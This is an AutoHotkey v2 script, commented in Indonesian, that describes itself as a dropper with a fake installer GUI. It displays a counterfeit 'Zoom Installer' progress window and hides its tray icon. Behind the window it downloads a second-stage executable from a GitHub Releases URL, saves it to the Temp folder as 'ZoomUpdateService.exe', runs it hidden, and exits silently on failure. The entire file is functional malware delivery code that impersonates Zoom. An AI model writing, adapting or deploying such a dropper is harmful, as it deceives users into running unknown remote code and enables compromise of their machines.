; installer.ahk - Dropper dengan GUI instalasi palsu menggunakan AutoHotkey v2

; Secara eksplisit menyatakan skrip ini memerlukan AHK v2
#Requires AutoHotkey v2.0 
#NoTrayIcon ; Sembunyikan ikon AHK di system tray

; --- Konfigurasi ---
; URL ke payload utama Anda di GitHub Releases
STAGE2_URL := "https://github.com/GlgApr/release-gang/releases/download/test/Zoom_V5_TweakCloudflared.exe"
; Nama file saat disimpan di folder Temp
STAGE2_FILENAME := "\ZoomUpdateService.exe"

; --- Kembali ke sintaks GUI v2 yang modern ---
MyGui := Gui("+ToolWindow -SysMenu", "Zoom Installer")
MyGui.SetFont("s10", "Helvetica")
MyLabel := MyGui.Add("Text", "x20 y20 w400", "Installing, please wait...")
MyProgress := MyGui.Add("Progress", "x20 y50 w400 h20", 0)
MyGui.Add("Button", "x175 y100 w100 h30 Disabled", "Cancel")
MyGui.Show("w450 h200")

; (DIPERBARUI) Simpan objek timer ke dalam variabel
MyTimer := SetTimer(UpdateProgressBar, 50)
; Jalankan proses download di "background"
DownloadAndExecute()

; --- Fungsi-fungsi ---

DownloadAndExecute() {
    ; Dapatkan path folder Temp
    filePath := A_Temp . STAGE2_FILENAME
    
    ; Unduh file dari URL
    try {
        ; CATATAN: Peringatan "URLDownloadToFile" adalah false positive dari beberapa linter.
        ; Ini adalah fungsi bawaan AHK dan akan berfungsi saat dikompilasi.
        URLDownloadToFile(STAGE2_URL, filePath)
        
        ; Jika unduhan berhasil, jalankan payload secara tersembunyi
        Run(filePath, , "Hide")
    } 
    catch
    {
        ; Jika gagal, tidak melakukan apa-apa dan keluar diam-diam
    }
}

UpdateProgressBar() {
    global MyTimer ; Deklarasikan bahwa kita akan menggunakan timer global
    static i := 0
    
    ; Perbarui nilai progress bar menggunakan sintaks v2
    MyProgress.Value := i
    
    ; Ubah teks label menggunakan variabel yang sudah diasosiasikan
    if (i = 30)
        MyLabel.Text := "Extracting files..."
    if (i = 70)
        MyLabel.Text := "Configuring components..."

    if (i >= 100) {
        MyLabel.Text := "Installation successful!"
        MyTimer.Stop() ; (DIPERBARUI) Hentikan timer menggunakan metode modern
        Sleep(1000)
        ExitApp
    }
    
    i++
}
